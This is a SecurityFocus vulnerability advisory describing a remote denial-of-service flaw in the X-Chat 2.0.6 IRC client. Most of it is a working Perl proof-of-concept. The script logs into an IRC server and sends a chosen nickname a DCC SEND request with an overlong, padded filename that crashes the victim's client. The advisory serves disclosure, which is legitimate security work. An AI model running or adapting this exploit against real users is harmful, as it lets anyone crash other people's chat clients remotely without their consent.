source: http://www.securityfocus.com/bid/9217/info

It has been reported that X-Chat may be prone to a remote denial of service vulnerability that may allow an attacker to crash the client by sending a malicious 'DDC SEND' request.

X-Chat version 2.0.6 running on a Linux platform has been reported to be affected by this issue resulting in a crash. Although unconfirmed, it is possible that other versions are affected as well. This issue is similar to mIRC DCC SEND Buffer Overflow Vulnerability 

#!/usr/bin/perl -w
use IO::Socket;
# get irc server to connect to, and nick to exploit.
print "Enter Serv: "; chomp($serv=<STDIN>);
print "Enter Nick: "; chomp($nick=<STDIN>);

#setup connection
$ocket = IO::Socket::INET->new(
                        PeerAddr=>"$serv",
			PeerPort=>'6667'
			) || die "could not connect to $serv: $!";

#$| = 1;
#$ocket->autoflush();
$line="";
until($line =~ /Ident/){
	$oldline=$line;
	$line = <$ocket>;
	if($oldline ne $line) {print $line;}
}

print $ocket "user ident irc name ircname\n";  #send ident/ircname info

$line="";
until($line =~/PING/){
	$oldline=$line;
	$line = <$ocket>;
	if ($oldline ne $line) {print $line;}
}


$line =~ s/.*://;
print $ocket "PONG :$line\n";
print $ocket "nick thssmnck\n";
print $ocket "privmsg $nick :DCC SEND \"a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a \" 1079095848 666\n";

